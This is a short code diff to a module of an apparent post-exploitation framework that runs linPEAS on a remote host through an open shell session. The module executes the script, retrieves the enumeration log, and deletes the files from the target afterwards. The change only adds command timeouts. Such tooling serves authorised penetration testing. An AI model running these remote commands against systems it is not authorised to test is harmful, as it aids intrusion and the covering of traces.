@@ -54,10 +54,10 @@ class Module(ModuleBase):
                 return
 
             print(brightyellow + "[*] Setting permissions and executing linPEAS...")
-            shell.run_command_tcp(sid, f"chmod +x {remote_script}")
+            shell.run_command_tcp(sid, f"chmod +x {remote_script}", timeout=0.5)
             # execute and append marker
             exec_cmd = f"{remote_script} > {remote_log} 2>&1; echo '{marker}' >> {remote_log}"
-            shell.run_command_tcp(sid, exec_cmd)
+            shell.run_command_tcp(sid, exec_cmd, timeout=0.5)
             
             # === BLOCKING POLL FOR MARKER ===
             print(brightyellow + "[*] Waiting for linPEAS to finish…")
@@ -65,7 +65,7 @@ class Module(ModuleBase):
                 if session_manager.is_tcp_session(sid):
                     out = shell.run_command_tcp(sid,
                     f"grep -F '{marker}' {remote_log} || echo ''"
-                    )
+                    , timeout=0.5)
                 else:
                     out = shell.run_command_http(sid,
                     f"grep -F '{marker}' {remote_log} || echo ''"
@@ -81,7 +81,7 @@ class Module(ModuleBase):
                     shell.download_file_tcp(sid, remote_log, local_outfile)
 
                     print(brightyellow + "[*] Cleaning up remote files...")
-                    shell.run_command_tcp(sid, f"rm -f {remote_script} {remote_log}")
+                    shell.run_command_tcp(sid, f"rm -f {remote_script} {remote_log}", timeout=0.5)
 
                     print(brightgreen + f"[+] linPEAS output saved to {local_outfile}")
                     print(brightblue + "\n=== linPEAS Output ===\n")
